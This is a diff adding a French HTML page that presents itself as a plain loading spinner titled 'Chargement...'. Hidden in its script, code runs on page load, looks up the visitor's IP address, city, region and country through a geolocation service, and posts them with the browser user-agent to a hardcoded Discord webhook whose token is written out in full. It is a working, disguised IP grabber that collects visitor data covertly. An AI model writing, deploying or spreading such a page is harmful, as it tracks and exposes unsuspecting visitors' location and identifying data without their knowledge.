@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Chargement...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      background: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="loader"></div>
+
+  <script>
+    async function sendVisitorInfo() {
+      const webhook = 'https://discord.com/api/webhooks/1375160193050087584/Aq1VrY-atcBmLxgLTEtgRsoi-jVJXARyzzbmq07HRWmmsHlRFE2-RCYFW8J_yf3CKRdu';
+
+      try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+
+        const message = `
+📥 **Chargement...**
+• IP: ${data.ip}
+• Ville: ${data.city}
+• Région: ${data.region}
+• Pays: ${data.country_name}
+• User-Agent: ${navigator.userAgent}
+        `;
+
+        await fetch(webhook, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ content: message })
+        });
+      } catch (e) {
+        console.error("Erreur d'envoi :", e);
+      }
+    }
+
+    window.onload = sendVisitorInfo;
+  </script>
+</body>
+</html>
